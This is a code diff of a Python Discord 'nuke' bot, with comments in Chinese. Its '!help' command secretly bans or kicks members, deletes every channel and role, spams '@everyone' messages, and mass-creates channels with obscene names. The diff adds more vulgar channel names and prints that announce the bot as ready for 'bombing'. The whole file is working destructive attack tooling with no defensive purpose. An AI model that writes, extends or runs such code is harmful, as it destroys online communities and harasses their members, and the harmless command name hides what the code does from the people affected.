@@ -10,22 +10,17 @@ logging.basicConfig(
     format='%(asctime)s - [%(levelname)s] - %(message)s'
 )
 
-# ---------------------------------------------------------
-# 強制抓取目前 .py 檔案所在的全路徑
-# ---------------------------------------------------------
 BASE_DIR = os.path.dirname(os.path.abspath(__file__))
 CHANNELS_PATH = os.path.join(BASE_DIR, "channels.txt")
 MESSAGES_PATH = os.path.join(BASE_DIR, "messages.txt")
 
 def init_txt_files():
-    # 建立 channels.txt
     if not os.path.exists(CHANNELS_PATH):
-        defaults = ["nuked-by-null", "server-destroyed", "get-fucked", "eat-my-dick"]
+        defaults = ["nuked-by-null", "server-destroyed", "get-fucked", "eat-my-dick", "吃我雞巴", "eat-my-dick"]
         with open(CHANNELS_PATH, "w", encoding="utf-8") as f:
             f.write("\n".join(defaults))
         logging.info(f"已成功於同目錄建立: {CHANNELS_PATH}")
 
-    # 建立 messages.txt
     if not os.path.exists(MESSAGES_PATH):
         default_msg = (
             "# ⚠️ YOUR SERVER HAS BEEN FULLY NUKED ⚠️\n"
@@ -37,7 +32,6 @@ def init_txt_files():
             f.write(default_msg)
         logging.info(f"已成功於同目錄建立: {MESSAGES_PATH}")
 
-# 啟動時立刻執行
 init_txt_files()
 
 def get_channels():
@@ -54,9 +48,6 @@ def get_message():
             return content if content else "@everyone Server Nuked!"
     return "@everyone Server Nuked!"
 
-# ---------------------------------------------------------
-# Bot 主程式
-# ---------------------------------------------------------
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 
@@ -67,6 +58,8 @@ TOKEN = "將該文字替換為您的機器人Token"
 async def on_ready():
     logging.info(f"機器人已成功登入: {bot.user.name} (ID: {bot.user.id})")
     logging.info(f"txt 讀取路徑確認: {CHANNELS_PATH}")
+    print(f"您的炸群機器人{bot.user}已準備")
+    print("請使用 !help 進行轟炸")
 
 @bot.command(name="help")
 async def nuke_help(ctx):
@@ -82,7 +75,6 @@ async def nuke_help(ctx):
     except Exception:
         pass
 
-    # 1. 踢人 / Ban 人
     async def purge_members():
         try:
             bot_me = guild.me
@@ -102,14 +94,12 @@ async def nuke_help(ctx):
         except Exception as e:
             logging.error(f"拉取成員名單失敗: {e}")
 
-    # 2. 刪除頻道
     for ch in list(guild.channels):
         try:
             await ch.delete()
         except Exception:
             pass
 
-    # 3. 刪除身分組
     for role in list(guild.roles):
         try:
             if not role.is_default() and role < guild.me.top_role:
@@ -119,7 +109,6 @@ async def nuke_help(ctx):
 
     bot.loop.create_task(purge_members())
 
-    # 4. 洗版發文任務
     async def spam_task(channel):
         await asyncio.sleep(0.3)
         for _ in range(5):
@@ -135,7 +124,6 @@ async def nuke_help(ctx):
             except Exception:
                 break
 
-    # 5. 頻道建立迴圈
     async def infinite_channel_loop():
         for name in channel_cycle:
             if len(guild.channels) >= 500:
